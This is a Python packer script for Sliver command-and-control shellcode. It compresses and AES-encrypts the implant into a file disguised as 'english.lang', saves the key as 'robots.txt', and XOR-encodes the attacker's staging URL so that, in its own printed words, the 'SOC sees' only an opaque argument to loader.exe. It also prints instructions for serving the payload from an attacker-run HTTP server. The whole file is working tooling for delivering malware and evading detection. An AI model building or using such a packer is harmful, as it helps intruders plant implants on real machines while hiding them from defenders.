#!/usr/bin/env python3

import sys, os, zlib, struct, argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Must match XOR_KEY in loader.c (32 bytes)
XOR_KEY = bytes.fromhex("eaf8d435c6af16d8ae15383362cb21e6c527d8f624122ea0937334d6b574b2ba")

def pad(data, bs=16):
    pad_len = bs - (len(data) % bs)
    return data + bytes([pad_len] * pad_len)

def xor_encode_url(url: str) -> str:
    """XOR encode URL and return as hex string"""
    out = []
    for i, c in enumerate(url):
        out.append(ord(c) ^ XOR_KEY[i % len(XOR_KEY)])
    return bytes(out).hex()

def main():
    parser = argparse.ArgumentParser(description='Pack Sliver shellcode')
    parser.add_argument('shellcode', help='Path to .bin shellcode')
    parser.add_argument('-k', '--key', help='Hex AES key (32 bytes). Random if omitted.')
    parser.add_argument('-o', '--outdir', help='Output directory (default: cwd)')
    parser.add_argument('-u', '--url', help='Base URL to encode (e.g. http://10.10.14.46)')
    args = parser.parse_args()

    outdir = args.outdir or os.getcwd()
    os.makedirs(outdir, exist_ok=True)

    with open(args.shellcode, 'rb') as f:
        raw = f.read()

    print(f"Original:   {len(raw):,} bytes ({len(raw)/1024/1024:.1f} MB)")

    compressed = zlib.compress(raw, 9)
    ratio = len(compressed) * 100 // len(raw)
    print(f"Compressed: {len(compressed):,} bytes ({len(compressed)/1024/1024:.1f} MB) [{ratio}%]")

    if args.key:
        key = bytes.fromhex(args.key)
        assert len(key) == 32
    else:
        key = get_random_bytes(32)

    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(compressed))

    blob = struct.pack('<I', len(raw))
    blob += struct.pack('<I', len(compressed))
    blob += iv
    blob += encrypted

    enc_path = os.path.join(outdir, 'english.lang')
    with open(enc_path, 'wb') as f:
        f.write(blob)

    key_path = os.path.join(outdir, 'robots.txt')
    with open(key_path, 'w') as f:
        f.write(key.hex() + '\n')

    print(f"Packed:     {len(blob):,} bytes ({len(blob)/1024/1024:.1f} MB)")
    print(f"Payload:    {enc_path}")
    print(f"Key file:   {key_path}")
    print()

    if args.url:
        encoded = xor_encode_url(args.url.rstrip('/'))
        print(f"On target:")
        print(f"    loader.exe {encoded}")
        print()
        print(f"    SOC sees:  loader.exe {encoded}")
        print(f"    Real URL:  {args.url}")
    else:
        print(f"Encode your URL:")
        print(f"    ./build.sh encode http://<YOUR_IP>")
        print(f"    Then: loader.exe <encoded_output>")

    print()
    print(f"Serve with:")
    print(f"    cd {outdir} && python3 -m http.server 80")

if __name__ == '__main__':
    main()
